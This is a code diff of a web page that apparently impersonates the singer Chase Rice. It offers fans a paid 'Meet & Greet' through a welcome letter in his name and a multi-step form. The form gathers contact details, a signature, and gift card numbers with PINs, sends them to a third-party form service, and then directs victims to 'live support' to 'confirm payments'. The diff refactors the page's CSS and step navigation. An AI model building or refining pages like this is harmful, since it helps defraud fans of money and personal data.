@@ -1144,57 +1144,56 @@ Log in</a><ul class="list list-social list-unstyled" role="list"><li class="list
       MEET & GREET
     </h2>
 <style>
-  body {
-    font-family: Arial, Helvetica, sans-serif;
-    background: #f9f9f9;
-    margin: 0;
-    padding: 15px;
-  }
-  form, .container {
-    border: 1px solid #ccc;
-    background: #fff;
-    padding: 20px;
-    margin-bottom: 20px;
-    border-radius: 6px;
-    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-  }
-  h3 {
-    margin-top: 0;
-  }
-  label {
-    display: block;
-    margin-top: 10px;
-    font-weight: bold;
-  }
-  input, select, button {
-    width: 100%;
-    padding: 12px;
-    margin-top: 8px;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-    box-sizing: border-box;
-    font-size: 16px;
-  }
-  button {
-    background-color: #04AA6D;
-    color: white;
-    border: none;
-    cursor: pointer;
-  }
-  button:hover {
-    opacity: 0.9;
-  }
-  #step2, #step3, #step4, #step5, #paymentStep {
-    display: none;
-  }
+body {
+  font-family: Arial, Helvetica, sans-serif;
+  background: #f9f9f9;
+  margin: 0;
+  padding: 15px;
+}
+form, .container {
+  border: 1px solid #ccc;
+  background: #fff;
+  padding: 20px;
+  margin-bottom: 20px;
+  border-radius: 6px;
+  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+}
+h3 {
+  margin-top: 0;
+}
+label {
+  display: block;
+  margin-top: 10px;
+  font-weight: bold;
+}
+input, select, button {
+  width: 100%;
+  padding: 12px;
+  margin-top: 8px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  box-sizing: border-box;
+  font-size: 16px;
+}
+button {
+  background-color: #04AA6D;
+  color: white;
+  border: none;
+  cursor: pointer;
+}
+button:hover {
+  opacity: 0.9;
+}
+/* Only use this class to hide steps */
+.hidden {
+  display: none;
+}
 </style>
 
-<form id="multiStepForm" action="https://api.web3forms.com/submit" method="POST">
-  <input type="hidden" name="access_key" value="42ad2877-f81e-4e64-9fc2-51d25c4a455e">
 
-  <!-- Step 1: Welcome -->
-  <div id="step1" class="container">
-    <h3>Message from Chase Rice</h3>
+<!-- Step 1: Welcome (NOT a form) -->
+<div id="step1" class="container">
+      <h3>Message from Chase Rice</h3>
     <p>First off, I just want to say thank you for all the love and support you’ve shown me throughout the years. Every show, every album, and every moment we’ve shared at the concerts wouldn’t be the same without you! Because of you, I get to live this dream, and I’m forever grateful.
 
 Now, I’m excited to offer you the chance to meet me in person and share some one-on-one time together! Whether you’re here to chat, take a photo, or just say hey, this is your chance to connect and make memories that will last a lifetime.
@@ -1202,14 +1201,19 @@ Now, I’m excited to offer you the chance to meet me in person and share some o
 I can’t wait to meet each and every one of you. Thank you again for being part of this journey with me let’s make this experience unforgettable!
 
 See you soon, Chase Rice</p>
-    <button type="button" id="proceedBtn">Proceed</button>
-  </div>
+  <button type="button" id="proceedBtn">Proceed</button>
+</div>
+
+<!-- Multi-step form starts here -->
+<form id="multiStepForm" action="https://api.web3forms.com/submit" method="POST">
+  <input type="hidden" name="access_key" value="42ad2877-f81e-4e64-9fc2-51d25c4a455e">
+
 
   <!-- Step 2: Event Details -->
   <div id="step2" class="container hidden">
     <h3>Event Details</h3>
     <label for="eventNameInput">Event Name:</label>
-    <input type="text" id="eventNameInput" name="event_name" placeholder="Enter event name" required>
+    <input type="text" id="eventNameInput" name="event_name" required>
 
     <label for="eventDateInput">Date of Event:</label>
     <input type="date" id="eventDateInput" name="event_date" required>
@@ -1218,7 +1222,7 @@ See you soon, Chase Rice</p>
     <input type="time" id="eventTimeInput" name="event_time" required>
 
     <label for="eventLocationInput">Location of Event:</label>
-    <input type="text" id="eventLocationInput" name="event_location" placeholder="Enter event location" required>
+    <input type="text" id="eventLocationInput" name="event_location" required>
 
     <button type="button" id="toStep3">Next</button>
   </div>
@@ -1227,13 +1231,13 @@ See you soon, Chase Rice</p>
   <div id="step3" class="container hidden">
     <h3>Attendee Information</h3>
     <label for="attendeeNameInput">Name:</label>
-    <input type="text" id="attendeeNameInput" name="name" placeholder="Enter your full name" required>
+    <input type="text" id="attendeeNameInput" name="name" required>
 
     <label for="phone">Phone Number:</label>
-    <input type="tel" id="phone" name="phone" placeholder="Enter phone number" required>
+    <input type="tel" id="phone" name="phone" required>
 
     <label for="attendeeEmailInput">Email Address:</label>
-    <input type="email" id="attendeeEmailInput" name="email" placeholder="Enter email address" required>
+    <input type="email" id="attendeeEmailInput" name="email" required>
 
     <button type="button" id="toStep4">Next</button>
   </div>
@@ -1242,13 +1246,13 @@ See you soon, Chase Rice</p>
   <div id="step4" class="container hidden">
     <h3>Meet & Greet Details</h3>
     <label for="celebrity_guest">Celebrity Guest:</label>
-    <input type="text" id="celebrity_guest" name="celebrity_guest" placeholder="Enter celebrity guest" required>
+    <input type="text" id="celebrity_guest" name="celebrity_guest" required>
 
     <label for="meet_greet_time">Meet & Greet Time:</label>
     <input type="time" id="meet_greet_time" name="meet_greet_time" required>
 
     <label for="meet_greet_location">Meet & Greet Location:</label>
-    <input type="text" id="meet_greet_location" name="meet_greet_location" placeholder="Enter location" required>
+    <input type="text" id="meet_greet_location" name="meet_greet_location" required>
 
     <button type="button" id="toStep5">Next</button>
   </div>
@@ -1261,7 +1265,7 @@ See you soon, Chase Rice</p>
     <label><input type="checkbox" name="insurance_ack" required> I understand insurance policies must be ensured for safety.</label>
 
     <label for="signature">Signature:</label>
-    <input type="text" id="signature" name="signature" placeholder="Enter signature" required>
+    <input type="text" id="signature" name="signature" required>
 
     <button type="button" id="toPayment">Next</button>
   </div>
@@ -1280,10 +1284,10 @@ See you soon, Chase Rice</p>
 
     <div id="giftCardDetails" style="display:none; margin-top:15px;">
       <label for="giftCardNumber">Gift Card Number:</label>
-      <input type="text" id="giftCardNumber" name="giftcard_number" placeholder="Enter gift card number">
+      <input type="text" id="giftCardNumber" name="giftcard_number">
 
       <label for="giftCardPin">Gift Card PIN:</label>
-      <input type="text" id="giftCardPin" name="giftcard_pin" placeholder="Enter gift card PIN">
+      <input type="text" id="giftCardPin" name="giftcard_pin">
     </div>
 
     <button type="submit">Finish</button>
@@ -1315,24 +1319,24 @@ document.addEventListener("DOMContentLoaded", () => {
 
   // Navigation buttons
   document.getElementById("proceedBtn").onclick = () => {
-    step1.style.display = "none";
-    step2.style.display = "block";
+    step1.classList.add("hidden");
+    step2.classList.remove("hidden");
   };
   document.getElementById("toStep3").onclick = () => {
-    step2.style.display = "none";
-    step3.style.display = "block";
+    step2.classList.add("hidden");
+    step3.classList.remove("hidden");
   };
   document.getElementById("toStep4").onclick = () => {
-    step3.style.display = "none";
-    step4.style.display = "block";
+    step3.classList.add("hidden");
+    step4.classList.remove("hidden");
   };
   document.getElementById("toStep5").onclick = () => {
-    step4.style.display = "none";
-    step5.style.display = "block";
+    step4.classList.add("hidden");
+    step5.classList.remove("hidden");
   };
   document.getElementById("toPayment").onclick = () => {
-    step5.style.display = "none";
-    paymentStep.style.display = "block";
+    step5.classList.add("hidden");
+    paymentStep.classList.remove("hidden");
   };
 
   // Gift card toggle
@@ -1343,11 +1347,11 @@ document.addEventListener("DOMContentLoaded", () => {
 
   paymentMethodSelect.addEventListener("change", function() {
     if (this.value === "Gift card") {
-      giftCardDetails.style.display = "block";
+      giftCardDetails.classList.remove("hidden");
       giftCardNumber.required = true;
       giftCardPin.required = true;
     } else {
-      giftCardDetails.style.display = "none";
+      giftCardDetails.classList.add("hidden");
       giftCardNumber.required = false;
       giftCardPin.required = false;
     }
@@ -1367,36 +1371,35 @@ document.addEventListener("DOMContentLoaded", () => {
 
       if (result.success) {
         const ticketNumber = "TCK-" + Math.floor(Math.random() * 1000000);
-        this.style.display = "none";
+        this.classList.add("hidden");
+        confirmationStep.classList.remove("hidden");
 
+        document.getElementById("ticketMessage").innerHTML =
+          "✅ Thank you! Your ticket has been confirmed.<br>" +
+          "📢 Contact live support to validate your ticket and confirm your payments and schedule";
 
-<script>
-document.addEventListener("DOMContentLoaded", () => {
-  // Step navigation
-  document.getElementById("toStep3").onclick = () => { step2.style.display="none"; step3.style.display="block"; step3.scrollIntoView({behavior:"smooth"}); };
-  document.getElementById("toStep4").onclick = () => { step3.style.display="none"; step4.style.display="block"; step4.scrollIntoView({behavior:"smooth"}); };
-  document.getElementById("toStep5").onclick = () => { step4.style.display="none"; step5.style.display="block"; step5.scrollIntoView({behavior:"smooth"}); };
-  document.getElementById("toPayment").onclick = () => { step5.style.display="none"; paymentStep.style.display="block"; paymentStep.scrollIntoView({behavior:"smooth"}); };
-
-  // Gift card toggle
-  const paymentMethodSelect = document.getElementById("paymentMethod");
-  const giftCardDetails = document.getElementById("giftCardDetails");
-  const giftCardNumber = document.getElementById("giftCardNumber");
-  const giftCardPin = document.getElementById("giftCardPin");
-
-  paymentMethodSelect.addEventListener("change", function() {
-    if (this.value === "Gift card") {
-      giftCardDetails.style.display = "block";
-      giftCardNumber.required = true;
-      giftCardPin.required = true;
-    } else {
-      giftCardDetails.style.display = "none";
-      giftCardNumber.required = false;
-      giftCardPin.required = false;
+        document.getElementById("ticketNumber").textContent = ticketNumber;
+        document.getElementById("eventName").textContent = document.getElementById("eventNameInput").value;
+        document.getElementById("userName").textContent = document.getElementById("attendeeNameInput").value;
+        document.getElementById("userEmail").textContent = document.getElementById("attendeeEmailInput").value;
+      } else {
+        alert("❌ Submission failed: " + result.message);
+      }
+    } catch (error) {
+      console.error("Network or CORS error:", error);
+      alert("⚠️ Error submitting form. Please check your connection.");
     }
   });
+
+  // Back to home
+  document.getElementById("homeBtn").onclick = () => {
+    confirmationStep.classList.add("hidden");
+    step1.classList.remove("hidden");
+  };
 });
 </script>
+
+
 
 
 
